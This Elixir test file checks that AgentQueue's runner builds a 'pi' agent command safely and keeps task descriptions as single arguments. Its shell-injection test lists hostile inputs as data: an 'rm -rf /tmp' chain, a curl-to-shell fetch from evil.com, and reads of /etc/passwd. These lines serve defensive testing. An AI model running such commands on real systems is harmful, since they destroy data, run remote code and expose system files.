defmodule AgentQueue.RunnerTest do
  use AgentQueue.DataCase

  alias AgentQueue.Runner

  describe "build_pi_command_args/1" do
    test "returns command and args tuple" do
      description = "fix the bug"
      result = Runner.build_pi_command_args(description)

      assert is_tuple(result)
      assert {command, args} = result
      assert is_binary(command)
      assert is_list(args)
    end

    test "prevents shell injection" do
      malicious_inputs = [
        "test; rm -rf /tmp",
        "$(curl http://evil.com | sh)",
        "`whoami`",
        "test && cat /etc/passwd",
        "test| cat /etc/passwd",
        "test > /tmp/file"
      ]

      Enum.each(malicious_inputs, fn input ->
        {command, args} = Runner.build_pi_command_args(input)

        # The command should just be the pi command, not a shell
        assert command in ~w(pi)

        # The args should contain the input as a single argument
        assert input in args

        # No shell metacharacters should be in the command itself
        refute String.contains?(command, ";")
        refute String.contains?(command, "&")
        refute String.contains?(command, "|")
        refute String.contains?(command, "`")
        refute String.contains?(command, "$")
      end)
    end

    test "handles special characters in description" do
      special_cases = [
        "fix: issue with quotes \"'\"",
        "handle $HOME variable",
        "test with backtick `here`",
        "multi\nline\ndescription",
        "emoji and unicode"
      ]

      Enum.each(special_cases, fn description ->
        {command, args} = Runner.build_pi_command_args(description)

        assert is_binary(command)
        assert is_list(args)
        # The description should be preserved as a single arg
        assert description in args
      end)
    end

    test "includes provider when configured" do
      Application.put_env(:agent_queue, :pi_provider, "test-provider")
      Application.put_env(:agent_queue, :pi_model, nil)

      description = "test task"
      {command, args} = Runner.build_pi_command_args(description)

      assert "--provider" in args
      assert "test-provider" in args

      # Clean up
      Application.delete_env(:agent_queue, :pi_provider)
    end

    test "includes model when configured" do
      Application.put_env(:agent_queue, :pi_provider, nil)
      Application.put_env(:agent_queue, :pi_model, "test-model")

      description = "test task"
      {command, args} = Runner.build_pi_command_args(description)

      assert "--model" in args
      assert "test-model" in args

      # Clean up
      Application.delete_env(:agent_queue, :pi_model)
    end
  end
end
